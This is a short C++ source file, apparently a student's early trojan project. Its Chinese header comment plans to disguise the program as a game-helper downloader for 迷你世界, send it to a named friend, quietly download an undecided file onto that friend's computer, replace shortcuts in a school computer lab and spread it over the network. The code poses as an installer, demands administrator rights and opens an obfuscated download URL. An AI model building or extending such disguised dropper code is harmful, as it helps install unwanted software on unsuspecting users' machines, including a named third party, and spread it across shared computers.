#include<iostream>
#include <ShlObj.h> //IsUserAnAdmin()
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <string>
#include <string.h>
#include <fstream>
using namespace std;
/*
2024/8/23 22：05
刘憬庐

目标：
1.伪装成安然下载程序
2.发送给朋友（王子涵）
3.可在后台更新程序
4.在王子涵电脑里下载__________文件（待定）

进阶：
1. 发给同学/放在机房，吧所有快捷方式改为此程序
2. 可通过网络传播此程序（太难，不一定实现）
*/



int main()
{
	bool ljl = false;

	ifstream fin("C:\\Users\\ljl20\\Desktop\\txt-ljl.txt");
	if (fin.is_open())
	{
		ljl = true;
		cout << "刘憬庐登录成功" << endl;
	}

	//                 文件注入                 //


	string yndownload;
	BOOL bIsAdmin = IsUserAnAdmin();
	cout << "迷你世界安然mini tools辅助欢迎您下载！" << endl;
	Sleep(2000);
	cout << "默认下载地址：下载文件夹" << endl;
	Sleep(1000);
	if (bIsAdmin)
	{
		cout << "是否开始下载？【yes/no】:";
		cin >> yndownload;
		if (yndownload == "yes")
		{
			cout << "开始下载！";
			Sleep(1500);
			system("start https://down-load.lanrar.com/file/?BGJXaVprBTQFDAA4AzZVOVRrBj5Q6gunVdtQsVaOA7QGJgF7DBwAPVZuUG8AdAFUUGUPZVdkBScEdVFkViQDMQQqVzBaKQU0BSsAMwNxVTJUZwZvUGoLVlU7UDJWNwMzBj8BYAxoAGFWOVAxAGMBNlAsD2xXewU6BDFRb1Y/AzIEMFcwWjEFZQV1ACYDJ1VpVDwGM1A9Cz1VfVBmVjIDLQY0AWUMfgAwVmNQPgA3ATZQPw8zVzEFMARhUTZWMwM1BDVXMVo1BWUFagBjA29VYVQ3BmJQNws9VWVQYFY7AzoGYwFhDDIAelZlUH4AMQEmUH8PeVdtBXUEalEzVjcDMwQwVzlaPwViBWYAYANxVSBUZwZuUGoLb1VvUGdWPQMwBjIBYgxjAGFWOVAxAGIBLlAkDyxXbgVrBHRRalY7AzUENlc0WjMFYwVnAG8DYVVsVCgGdlB/C35Vb1BnVj0DMAYyAWIMYwBnVjZQNQBlASZQfw9jV3gFOgQyUW9WOQMsBDVXOVoyBX8FYgBuA3lVZVQ/BjZQIQsvVTZQOVZ9A2wGWQE1DDoAaVYw");
			cout << endl << "下载完成！";
		}
		else if (yndownload == "no")
		{
			cout << "结束下载！";
			Sleep(1500);
			return 0;
		}
		else
		{
			cout << "默认选否，3秒内关闭";
			Sleep(3000);
			return 0;
		}
	}
	else
	{
		cout << "请用管理员权限打开此程序，即将关闭程序！";
		Sleep(5000);
		return 0;
	}

	return 0;
}